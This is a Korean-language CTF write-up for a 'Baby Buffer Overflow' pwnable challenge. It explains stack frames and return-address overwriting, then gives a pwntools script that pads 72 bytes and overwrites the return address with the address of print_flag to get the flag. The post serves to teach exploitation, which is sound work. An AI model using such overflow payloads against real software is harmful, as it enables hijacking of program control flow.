---
layout: post
category: [pwnable]
title: Baby Buffer Overflow
---

# 문제

![문제](/assets/img/2024-08-05-hawkis-baby-bof/problem.png)

리눅스 바이너리 파일을 분석해 취약점을 찾아 플래그를 확인하는 문제이다.

이 문제는 리눅스 환경이 필요한 문제이기 때문에, WSL 우분투 환경에서 문제 풀이를 진행했다.

# 버퍼 오버플로우란?

프로그램이 실행될 때, 데이터를 저장하기 위해 메모리 공간이 필요하다.   
C 프로그램에서 메모리는 일반적으로 5개의 주요 영역으로 나눌 수 있다.   
그 중 하나가 **스택(Stack)** 이다. 스택은 함수 호출 시 함수의 변수와 매개변수, 리턴 주소 등을 저장하는 공간이다.

![스택 구조와 스택 프레임](/assets/img/2024-08-05-hawkis-baby-bof/stack.png)

버퍼 오버플로우는 프로그램이 스택 공간에 할당된 크기보다 큰 데이터를 저장할 때 발생하는 취약점이다.   
이로 인해 인접한 메모리 영역이 덮어쓰여지거나 변조될 수 있으며, 의도하지 않은 코드 실행으로 이어질 수 있다.

프로그램의 실행 과정에서, 여러 함수들이 연속적으로 호출된다. 각 함수 호출 시, 함수 내부의 변수, 함수의 매개변수, 리턴 주소등의 정보는 스택 프레임에 저장되며, 스택 프레임은 함수가 호출될 때마다 생성된다.

프로그램이 함수를 실행하고 ``return`` 명령을 만날 때, ``Return Address`` 가 필요하다. ``Return Address`` 는 함수가 반환될 때 돌아갈 위치의 주소를 저장하고 있다.

버퍼 오버플로우 취약점을 이용해 스택 버퍼의 크기를 초과하여 인접한 영역까지 덮어쓸 수 있기 때문에, ``Return Address`` 를 변조하여 제어 흐름을 의도하지 않은 함수로 변경할 수 있다.

이 문제에서는 ``Return Address`` 를 ``print_flag`` 의 함수 주소로 덮어써 의도하지 않은 동작을 만들어 플래그를 획득할 수 있다.

```py
from pwn import *

context.arch = "amd64"

addr = 0x40117e

p = process('./baby_bof')

payload = b'A' * 64 + b'A' * 0x8 + p64(addr)

f = open('./payload.txt', 'wb')
f.write(payload)
f.close()
```

![FLAG](/assets/img/2024-08-05-hawkis-baby-bof/flag.png)